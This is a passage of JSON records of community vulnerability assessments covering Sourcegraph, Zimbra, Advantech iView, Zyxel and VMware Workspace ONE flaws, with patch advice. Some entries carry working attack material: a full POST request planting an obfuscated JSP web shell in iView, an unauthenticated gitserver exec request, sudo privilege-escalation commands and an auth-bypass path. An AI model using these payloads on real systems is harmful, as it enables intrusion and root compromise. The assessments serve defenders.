      "document": "A vulnerability exists in the gitserver component of SourceGraph that allows remote and unauthenticated attackers that can access the service to configure git's `core.sshCommand` value which can then be triggered on demand by forcing a push operation. In order to be exploitable, the SourceGraph instance must have at least one cloned repository present. Cloning a repository is the first post-installation step that a Source Graph administrator is prompted to take. Once one or more repositories are cloned, a remote and unauthenticated attacker can enumerate them using `curl http://$target:3178/list?cloned=true`.  Successful exploitation results in code execution in the context of the gitserver user.\r\n\r\nWhile a server with no cloned repositories is not exploitable, the vulnerability can still be checked by analyzing the response to a filtered command. The vulnerability can be checked for using the following curl command where `$target` is the target server. This command fetches the current `core.sshCommand` value and does not change it.\r\n\r\n```\r\ncurl -X POST http://$target:3178/exec -d '{\"Repo\": \"repo\", \"Args\": [\"config\", \"--default\", \"\", \"core.sshCommand\"]}'\r\n```\r\n\r\nIf the response is HTTP/400 with a body of \"invalid command\", the server is not vulnerable. If it's HTTP/404, it's vulnerable but the selected repository does not exists, while if it's HTTP/200 it's vulnerable and the repository does exist.\r\n\r\nSourceGraph fixed the vulnerability in version 3.37, but users must opt into the solution. The implemented fix was in the form of optional filtering on the `/exec` endpoint to restrict the git commands that are able to be executed. Commit [baff5680](https://github.com/sourcegraph/sourcegraph/commit/baff5680d7e3d90c4eceb9eb775733e0dcb504fd) (first released in v3.37) sets this value to default to `true` however it does not appear to be the default for new installations. It's unclear what the word `default` means in this context. At the time of this writing, it looks like [a future release](https://github.com/sourcegraph/sourcegraph/blob/e807bbee53c8230142a66f17bd70af2f6f1f8184/CHANGELOG.md?plain=1#L35) may remove the option and always include the functionality. In the mean time, to enable this, SourceGraph administrators must navigate to `Configuration > Site Configuration`and add the following JSON blob to the configuration file.\r\n\r\n```json\r\n\"experimentalFeatures\": {\r\n    \"enableGitServerCommandExecFilter\": true\r\n  }\r\n```\r\n\r\nWith that in place, the server will be patched for this vulnerability as unauthorized commands will be blocked. Blocked commands are logged since version 3.37 regardless of whether or not the filtering is active. A blocked command will generate a log line such as the following:\r\n\r\n```\r\n22:11:37                 gitserver | {\"SeverityText\":\"WARN\",\"Timestamp\":1657750297008909456,\"InstrumentationScope\":\"server\",\"Caller\":\"server/server.go:1381\",\"Function\":\"github.com/sourcegraph/sourcegraph/cmd/gitserver/server.(*Server).exec\",\"Body\":\"exec: bad command\",\"Resource\":{\"service.name\":\"gitserver\",\"service.version\":\"3.41.0\",\"service.instance.id\":\"127.0.0.1:3178\"},\"Attributes\":{\"RemoteAddr\":\"192.168.159.128:45316\",\"req.Args\":[\"config\",\"--default\",\"\",\"core.sshCommand\"]}}\r\n```\r\nIn this case the command that was run was `git config --default \"\" core.sshCommand` from the test curl command.\r\n\r\nSee also https://github.com/rapid7/metasploit-framework/pull/16762",
      "score": 1,
      "metadata": {
        "attacker-value": 3,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "fcb1c463-4758-4944-a2e7-0a370b567d0a",
      "editorId": "dadd7295-ffae-449d-ba22-0a6feefa6f67",
      "topicId": "efc2ee2a-9172-4b00-94c9-6cc133bd4b05",
      "created": "2022-07-18T16:55:14.197087Z",
      "revisionDate": "2022-07-27T16:35:10.348317Z",
      "document": "While we focused on Zimbra in our analysis, there are almost certainly other targets for this vulnerability that we are not aware of yet.\r\n\r\nExploiting this against Zimbra is really bad - it can be done fairly quietly and it doesn't require direct access to the server, and can easily lead to root access to the server hosting users' email. This is super urgent to patch on Zimbra!",
      "score": 3,
      "metadata": {
        "attacker-value": 5,
        "exploitability": 3
      },
      "tags": [
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        },
        {
          "id": "3e5a47c9-35b0-4d55-92e4-0e83e6cbb2ec",
          "name": "Difficult to weaponize",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "difficult_to_develop"
        }
      ]
    },
    {
      "id": "43c07d86-44d8-4554-a895-bf40f9eb1a49",
      "editorId": "e426cc12-067c-41a8-83c0-029757da0dbf",
      "topicId": "ce6dbb5e-d080-4a32-af7d-46bd619c2947",
      "created": "2022-07-22T17:38:15.45817Z",
      "revisionDate": "2022-07-27T16:31:37.188202Z",
      "document": "An unauthenticated attacker can leverage this command injection vulnerability to gain remote code execution against vulnerable versions of Advantech iView software. The software runs as `NT AUTHORITY\\SYSTEM`, so this will ultimately give an attacker unauthenticated privileged access with relatively low effort.\r\n\r\nThe vulnerability lies in the `NetworkServlet` database backup functionality:\r\n\r\n```java\r\n  private boolean backupDatabase(HttpServletRequest request, HttpServletResponse response) {\r\n    boolean bReturn = false;\r\n    String strResults = new String();\r\n    String strFilename = request.getParameter(\"backup_filename\");\r\n    String strExecuteCmd = new String();\r\n    String strMySQLPath = new String();\r\n    String strDbBackupFilePath = new String();\r\n    DBServices tempDBServices = new DBServices();\r\n    Process runtimeProcess = null;\r\n    SystemTable tempSystemTable = new SystemTable();\r\n    boolean errFile = false, sqlInj = false;\r\n    CUtils cutil = new CUtils();\r\n    if (strFilename != null && !strFilename.equals(\"\"))\r\n      errFile = cutil.checkFileNameIncludePath(strFilename);     <---\r\n    sqlInj = cutil.checkSQLInjection(strFilename);     <---\r\n    ...\r\n    return bReturn;\r\n  }\r\n```\r\n\r\nTwo checks are performed on the user-controlled `strFileName` variable (`backup_filename` in POST). The first check is a test for attempted directory traversal or an attempt to write a file to known executable directories:\r\n\r\n```java\r\n  public boolean checkFileNameIncludePath(String filename) {\r\n    boolean result = false;\r\n    if (filename.contains(\"../\") || filename.contains(\"/Microsoft/Windows/\")) {\r\n      result = true;\r\n    } else if (filename.contains(\"..\\\\\") || filename.contains(\"\\\\webapps\\\\\") || filename.contains(\"\\\\Apache Software Foundation\\\\\")) {\r\n      result = true;\r\n    } \r\n    if (result)\r\n      System.out.println(\"Error: Directory Traversal Vulnerability detected in [\" + filename + \"]\"); \r\n    return result;\r\n  }\r\n```\r\n\r\nThe second check simply determines whether the `strFileName` includes any SQL keywords that would imply a SQL injection attempt. It also checks for attempts at executing arbitrary commands via `getRuntime().exec()`:\r\n\r\n```java\r\npublic boolean checkSQLInjection(String model0) {\r\n    boolean result = false;\r\n    String model = model0.toLowerCase();\r\n    if (model.contains(\" or \") || model.contains(\"'or \") || model.contains(\"||\") || model.contains(\"==\") || model.contains(\"--\")) {\r\n      result = true;\r\n    } else if (model.contains(\"union\") && model.contains(\"select\")) {\r\n      if (checkCommentStr(model, \"union\", \"select\"))\r\n        result = true; \r\n    } else if (model.contains(\"case\") && model.contains(\"when\")) {\r\n      if (checkCommentStr(model, \"case\", \"when\"))\r\n        result = true; \r\n    } else if (model.contains(\"into\") && model.contains(\"dumpfile\")) {\r\n      if (checkCommentStr(model, \"into\", \"dumpfile\"))\r\n        result = true; \r\n    } else if (model.contains(\"into\") && model.contains(\"outfile\")) {\r\n      if (checkCommentStr(model, \"into\", \"outfile\"))\r\n        result = true; \r\n    } else if (model.contains(\" where \") && model.contains(\"select \")) {\r\n      result = true;\r\n    } else if (model.contains(\"benchmark\")) {\r\n      result = true;\r\n    } else if (model.contains(\"select\") && model.contains(\"from\")) {\r\n      if (checkCommentStr(model, \"select\", \"from\"))\r\n        result = true; \r\n    } else if (model.contains(\"select/*\")) {\r\n      result = true;\r\n    } else if (model.contains(\"delete\") && model.contains(\"from\")) {\r\n      if (checkCommentStr(model, \"delete\", \"from\"))\r\n        result = true; \r\n    } else if ((model.contains(\"drop\") && model.contains(\"table\")) || (model.contains(\"drop\") && model.contains(\"database\"))) {\r\n      if (checkCommentStr(model, \"drop\", \"table\"))\r\n        result = true; \r\n      if (checkCommentStr(model, \"drop\", \"database\"))\r\n        result = true; \r\n    } else if (model.contains(\"sleep(\") || model.contains(\" rlike \") || model.contains(\"rlike(\") || model.contains(\" like \")) {\r\n      result = true;\r\n    } else if (model.startsWith(\"'\") && model.endsWith(\"#\") && model.length() > 5) {\r\n      result = true;\r\n    } else if ((model.startsWith(\"9999'\") || model.endsWith(\"#9999\") || model.contains(\"#9999\")) && model.length() > 10) {\r\n      result = true;\r\n    } else if (model.contains(\"getRuntime().exec\") || model.contains(\"getruntime().exec\") || model.contains(\"getRuntime()\")) {\r\n      result = true;\r\n    } \r\n    if (result)\r\n      System.out.println(\"Error: SQL Injection Vulnerability detected in [\" + model0 + \"]\"); \r\n    return result;\r\n  }\r\n```\r\n\r\nReturning to `backupDatabase()`, as long as the `strFileName` variable passes the two above checks it will be used in forming a `mysqldump` command which will be executed via `Runtime.getRuntime().exec()`. Since the previous sanitization checks didn't take `mysqldump` arguments into account, the `-r` and `-w` flags can be used for exploitation. \r\n\r\n```java\r\nprivate boolean backupDatabase(HttpServletRequest request, HttpServletResponse response) {\r\n  ...\r\n if (!errFile && !sqlInj) {\r\n      if (tempDBServices.getMySQLLocation()) {\r\n        strMySQLPath = tempDBServices.getMySQLPath();\r\n        if (tempDBServices.retrieveDbSettings()) {\r\n          String strUser = tempDBServices.getStrLoginUserID();\r\n          String strPassword = tempDBServices.getStrLoginPassword();\r\n          if (tempSystemTable.findDbBackupFilePath()) {\r\n            strDbBackupFilePath = tempSystemTable.getDbBackupFilePath();\r\n            strDbBackupFilePath = String.valueOf(strDbBackupFilePath) + strFilename;\r\n            if (DBServices.OsUtils.isWindows()) {\r\n              strExecuteCmd = \"\\\"\" + strMySQLPath;\r\n              strExecuteCmd = String.valueOf(strExecuteCmd) + \"bin\\\\mysqldump\\\" -hlocalhost -u \" + strUser + \" -p\" + strPassword + \" --add-drop-database -B iview -r \\\"\" + strDbBackupFilePath + \"\\\"\";\r\n            } \r\n            try {\r\n              runtimeProcess = Runtime.getRuntime().exec(strExecuteCmd);\r\n  ...\r\n```\r\n\r\nThe `-r` flag designates a file for the output of the `mysqldump` command, and the `-w` flag allows the user to supply a condition for the command, which will end up in the output file. Given this, an attacker can pass in a jsp stub as the condition, and they will now have the ability to execute code on the target. This can be done with a single POST request (parameters not encoded for readability):\r\n\r\n```\r\nPOST /iView3/NetworkServlet HTTP/1.1\r\nHost: 192.168.140.200:8080\r\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 12.2; rv:97.0) Gecko/20100101 Firefox/97.0\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 469\r\n\r\npage_action_type=backupDatabase&backup_filename=Qivsaus.sql\" -r \"./webapps/iView3/ZQmIfz.jsp\" -w \"<%=new String(com.sun.org.apache.xml.internal.security.utils.JavaUtils.getBytesFromStream((new ProcessBuilder(request.getParameter(new java.lang.String(new byte[]{119,83,97,65,116,110,68,88})),request.getParameter(new java.lang.String(new byte[]{107,88,108,74})),request.getParameter(new java.lang.String(new byte[]{81,72,108,68,101,102}))).start()).getInputStream()))%>\"\r\n```\r\n\r\nThe patch for this vulnerability makes authentication a requirement for accessing the `NetworkServlet` endpoint. Since this vuln is trivial to exploit, I would recommend this one as high priority to patch. Credit goes to y4er for original blog [post](https://y4er.com/post/cve-2022-2143-advantech-iview-networkservlet-command-inject-rce) and PoC",
      "score": 5,
      "metadata": {
        "attacker-value": 4,
        "exploitability": 4
      },
      "tags": [
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "36d626c7-3cc3-4497-9974-1f1fc95cb520",
      "editorId": "b50031c2-b390-4cf9-bf6f-7a5fb8cf8677",
      "topicId": "7376cdcf-1933-4309-b148-310447c2ee97",
      "created": "2022-07-26T16:07:36.275074Z",
      "revisionDate": "2022-07-27T16:30:54.12972Z",
      "document": "Based on updated analysis from Maurizio Agazzini over at https://security.humanativaspa.it/zyxel-authentication-bypass-patch-analysis-cve-2022-0342/, it appears the impact of this vulnerability is a lot higher than initially anticipated. I think what our analysis and possibly others failed to realize is that a lot of this vulnerability is dependent on the actual port that you send the request to. \r\n\r\nIn the analysis listed above they noted that the following ports are associated with Apache:\r\n- 8008\r\n- 54088\r\n- 80\r\n- 4433\r\n- 443\r\n\r\nAnd if we access the port 8008 we get a VPN Authorize authentication prompt, which appears to be related to 2FA. However note that unlike @jbaines-r7's assessment, the prompt isn't exactly the same and contains the text \"VPN Authorize\" at the top.\r\n\r\nFrom this they then realized that since this must be related to 2FA, there is a configuration file at `/var/zyxel/service_conf/httpd_twofa.conf` which controls this. Looking at the configuration showed it was set up to listen on port 8008, the same port accessed earlier, and gave some more information on setup.\r\n\r\nThey they accessed port 54088 whilst exploring the other ports and noticed it contained what looked to be a block page. This is common on firewalling/website blocking apps where they will run a website on a port and redirect to that port to show the block page whenever a website that is deemed to be \"bad\" is attempted to be accessed by a user.\r\n\r\nLooking at this and noticing it was a blockpage lead them to `/var/zyxel/service_conf/cf_blockpage_https.conf` which showed that port 54088 was being used for the cf_blockpage service,.\r\n\r\nThey then noticed both of these configuration files referenced `/usr/local/apache/cgi-bin` using the Directory configuration directive as described at https://httpd.apache.org/docs/2.4/mod/core.html#directory, which would have the configuration option `SSLOptions +StdEnvVars` which as described at https://httpd.apache.org/docs/trunk/mod/mod_ssl.xml#ssloptions, sets \"the standard set of SSL related CGI/SSI environment variables are created. This per default is disabled for performance reasons, because the information extraction step is a rather expensive operation. So one usually enables this option for CGI and SSI requests only.\" So this is interesting as it indicates we might be using CGI scripts on these endpoints.\r\n\r\nAt this point they then looked at `/usr/local/zyxel-gui/httpd.conf` and found that the `/usr/local/apache/cgi-bin` directory has a ScriptAlias for `/cgi-bin/`, meaning one can access the scripts in this directory by browsing to `/cgi-bin/`. Because this was configured in a global area though, this means that all the CGIs inside the `/usr/local/apache/cgi-bin` directory are accessible on every different virtual host the server provides.\r\n\r\nAs a final point they show that they could get around some of the authentication errors by sending a CGI request not to port 443, but instead to port 8008, and the same request worked fine, which allowed them to export the `startup-config.conf` file. This is just one example though as now they can essentially access any CGI endpoints on the server without authentication and are limited only by what the CGI script allows them to do.\r\n\r\n",
      "score": 2,
      "metadata": {
        "attacker-value": 4,
        "exploitability": 4
      },
      "tags": [
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "3ba10e8f-6434-4a63-824f-827f432ab653",
      "editorId": "8a465efa-5959-4307-868a-5c6bd2f9fdc9",
      "topicId": "00a44135-5bf7-42a7-bd76-ae40a198175c",
      "created": "2022-08-12T15:59:54.529418Z",
      "revisionDate": "2022-08-15T14:13:39.167503Z",
      "document": "Researcher Petrus Viet submitted his technical analysis explaining an authentication bypass vulnerability affecting local domain users. A malicious actor with network access to the UI may be able to obtain administrative access without the need to authenticate for VMware Workspace ONE Access, Identity Manager and vRealize Automation.\r\nPlease see this reference for the details:  https://petrusviet.medium.com/dancing-on-the-architecture-of-vmware-workspace-one-access-eng-ad592ae1b6dd\r\n\r\nA quick summary of his write-up can be found here.\r\n***\r\nBasically this vulnerability is related to another authentication bypass (CVE-2022\u201322972) that was discovered in May 2022 (see reference https://blog.assetnote.io/2022/05/27/understanding-cve-2022-22972-vmware-workspace-one-access/) and was also analysed in detail by Rapid7 (see reference https://attackerkb.com/topics/Ur2L7rHv2F/cve-2022-22972). \r\n\r\nThe java web architecture is based on a **listener->filter->servlet** construct to send web request to a java web container.\r\nPetrus discovered that you can use the UrlRewriteFilter layer which is responsible for mapping requests to some internal servlets based on predefined rules (in the WEB-INF/urlrewrite.xml file) to read arbitrary files.\u2028\r\nOne particular predefined rule with the regex **\u201c^/t/([^/])(\\(|/)(((?!META-INF| WEB-INF).))\\)\u201d** will filter any request which has the path math and will map it to servlet **\u201c/$3\u201d** allowing attackers to read arbitrary files at WEB-INF.\r\n\r\n>Example: \r\n>Based on the regex, we can easily see that the request needs to start with **\u201c/SAAS/t/_/;/\u201d**, so for the request based on the rule with the path **\u201c/SAAS/t/_/;/WEB-INF/web.xml\u201d** it will be mapped to **\u201c/WEB-INF/web.xml\u201d**\r\n\r\nWith CVE-2022\u201322972 in the back of our mind, this vulnerability can be easily exploited to bypass the patch applied for CVE-2022-22972, where the developers added a HostHeaderFilter class to the filter chain to block all requests with a host header that doesn't point to the server.\r\n\r\nBy manipulating the path **\u201c/auth/login/embeddedauthbroker/callback\u201d** using the path **\u201c/SAAS/t/_/;/auth/login/embeddedauthbroker/callback\u201d** based on the predefined rule early explained, it will bypass the HostHeaderFilter class, hence you can bypass the authentication again on a patched server.\r\n\r\nThere is a POC from horizon3ai at GitHub for CVE-2022\u201322972 (https://github.com/horizon3ai/CVE-2022-22972) that can be reused to test this vulnerability.\r\n\r\nCombining this vulnerability with CVE-2022-31659 that allows remote code execution once the malicious user obtains administrator privileges makes VMware Workspace ONE Access, Identity Manager and vRealize Automation targets again.\r\n\r\nVMWare has released patches (https://www.vmware.com/security/advisories/VMSA-2022-0021.html) for both CVEs, and it is recommended that all VMWare Workspace ONE clients apply these patches immediately to mitigate potential exploitation.\r\n",
      "score": 2,
      "metadata": {
        "mitre-tactics": "Credential Access",
        "attacker-value": 5,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "0c7c0982-0ac0-418b-a4cf-1797fd51a6ce",
      "editorId": "1754d880-537c-48c4-8738-5ad2ccde5258",
      "topicId": "db3187c7-f203-4038-a6b2-269ebdf3c94c",
      "created": "2022-08-15T20:32:50.537791Z",
      "revisionDate": "2022-08-15T20:43:01.595082Z",
      "document": "The VMware Workspace ONE Access, Identity Manager, and vRealize Automation products contain a locally exploitable vulnerability whereby the under-privileged horizon user can escalate their permissions to those of the root user. Notably, the horizon user runs the externally accessible web application. This means that remote code execution (RCE) within that component could be chained with this vulnerability to obtain remote code execution as the root user. \r\n\r\nThe vulnerability is due to the fact that the permissions on the file `/opt/vmware/certproxy/bin/cert-proxy.sh` are such that the horizon user is both the owner and has access to invoke this file.\r\n\r\nTo demonstrate and exploit this vulnerability, that file is overwritten, and then the following command is executed as the horizon user:\r\n\r\n`sudo /usr/local/horizon/scripts/certproxyService.sh restart`\r\n\r\nNote, that depending on the patch level of the system, the `certproxyService.sh` script may be located at an alternative path and require a slightly different command:\r\n\r\n`sudo /opt/vmware/certproxy/bin/certproxyService.sh restart`\r\n\r\nIn both cases, the horizon user is able to invoke the certproxyService.sh script from sudo without a password. This can be verified by executing `sudo -n --list`. The `certproxyService.sh` script invokes the systemctl command to restart the service based on its configuration file. The service configuration file, located at `/run/systemd/generator.late/vmware-certproxy.service`, dispatches to `/etc/rc.d/init.d/vmware-certproxy` through the ExecStart and ExecStop directives, which in turn executes `/opt/vmware/certproxy/bin/cert-proxy.sh`.\r\n\r\nThe horizon user should not be the owner of or have write access to any executable files that run as root.\r\n\r\nSee the [original disclosure](https://www.rapid7.com/blog/post/2022/08/05/cve-2022-31660-and-cve-2022-31661-fixed-vmware-workspace-one-access-identity-manager-and-vrealize-automation-lpe/) for more information. This vulnerability has a public exploit in the form of a [Metasploit module](https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/linux/local/vmware_workspace_one_access_certproxy_lpe.rb).",
      "score": 1,
      "metadata": {
        "mitre-tactics": "Privilege Escalation",
        "attacker-value": 3,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "2817eab3-35ed-42c1-8eda-9af7dec8a3bb",
      "editorId": "1754d880-537c-48c4-8738-5ad2ccde5258",
      "topicId": "be37ee17-96fb-433b-b594-77a018f882a1",
      "created": "2022-08-15T20:40:00.381435Z",
      "revisionDate": "2022-08-15T20:41:04.023175Z",
      "document": "The VMware Workspace ONE Access, Identity Manager, and vRealize Automation products contain a locally exploitable vulnerability whereby the under-privileged horizon user can escalate their permissions to those of the root user. Notably, the horizon user runs the externally accessible web application. This means that remote code execution (RCE) within that component could be chained with this vulnerability to obtain remote code execution as the root user.\r\n\r\nThe vulnerability is due to the fact that the `/usr/local/horizon/scripts/getProtectedLogFiles.hzn` script can be run with root privileges without a password using the sudo command. This script in turn will recursively change the ownership of a user-supplied directory to the horizon user, effectively granting them write permissions to all contents.\r\n\r\nTo demonstrate and exploit this vulnerability, the following command is executed as the horizon user:\r\n\r\n`sudo /usr/local/horizon/scripts/getProtectedLogFiles.hzn exportProtectedLogs /usr/local/horizon/scripts/`\r\n\r\nAt this point, the horizon user has write access (through ownership) to a variety of scripts that they also have the right to invoke using sudo without a password. These scripts can be verified by executing `sudo -n --list`. A careful attacker would have backed up the ownership information for each file in the directory they intend to target, and restored them once they had obtained root-level permissions.\r\n\r\nThe root cause of this vulnerability is that the `exportProtectedLogs` subcommand invokes the `getProtectedLogs` function which will change the ownership information to the TOMCAT_USER which happens to be horizon.\r\n\r\nExcerpt from `getProtectedLogFiles.hzn`:\r\n\r\n```bash\r\nfunction getProtectedLogs()\r\n{\r\n    chown ${TOMCAT_USER}:${TOMCAT_GROUP} $TARGET_DIR_LOCATION\r\n    rm -f $TARGET_DIR_LOCATION/messages*\r\n    rm -f $TARGET_DIR_LOCATION/boot*\r\n    rm -rf $TARGET_DIR_LOCATION/journal*\r\n\r\n    cp $VAR_LOG_MESSAGES* $TARGET_DIR_LOCATION\r\n    cp $BOOT_LOG_MESSAGES* $TARGET_DIR_LOCATION\r\n    chown -R ${TOMCAT_USER}:${TOMCAT_GROUP} $TARGET_DIR_LOCATION/\r\n\r\n}\r\n```\r\n\r\nSee the [original disclosure](https://www.rapid7.com/blog/post/2022/08/05/cve-2022-31660-and-cve-2022-31661-fixed-vmware-workspace-one-access-identity-manager-and-vrealize-automation-lpe/) for more information.",
      "score": 1,
      "metadata": {
        "mitre-tactics": "Privilege Escalation",
        "attacker-value": 3,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "e7c63866-45be-4216-a8b1-0d3c03613d72",
      "editorId": "dadd7295-ffae-449d-ba22-0a6feefa6f67",
      "topicId": "c83f5b74-ac72-42d5-a71f-c8f4144c4c9d",
      "created": "2022-08-16T20:10:50.077484Z",
      "revisionDate": "2022-08-16T20:10:50.077489Z",
      "document": "Ultimately, this is annoying and unreliable to exploit, but we did get it working and confirm it's a problem.",
      "score": 1,
      "metadata": {
        "attacker-value": 5,
        "exploitability": 1
      },
      "tags": [
        {
          "id": "791283de-d643-4ede-850e-91a6edb897db",
          "name": "Exploited in the wild",
          "type": "exploited_in_the_wild",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "exploited_in_the_wild"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        },
        {
          "id": "3e5a47c9-35b0-4d55-92e4-0e83e6cbb2ec",
          "name": "Difficult to weaponize",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "difficult_to_develop"
        }
      ]
    },
    {
      "id": "be3194a3-b80f-441b-89fe-3578950b8282",
      "editorId": "dadd7295-ffae-449d-ba22-0a6feefa6f67",
      "topicId": "48ef6c32-59b4-4ad7-be9a-0ee8a2e86072",
      "created": "2022-08-19T16:18:15.951928Z",
      "revisionDate": "2022-08-23T10:03:34.830456Z",
      "document": "This is really bad - remote root on an organization's email server, if combined with other (currently 0-day vulnerabilities). Patch ASAP!",
      "score": 2,
      "metadata": {
        "attacker-value": 5,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "791283de-d643-4ede-850e-91a6edb897db",
          "name": "Exploited in the wild",
          "type": "exploited_in_the_wild",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "exploited_in_the_wild"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "da773bed-c065-4327-83c5-35834c29f8bc",
      "editorId": "8a465efa-5959-4307-868a-5c6bd2f9fdc9",
      "topicId": "1034a481-7074-4e9f-9c4f-962b5e549ac3",
      "created": "2022-08-19T21:58:11.023503Z",
      "revisionDate": "2022-08-25T06:47:01.316856Z",
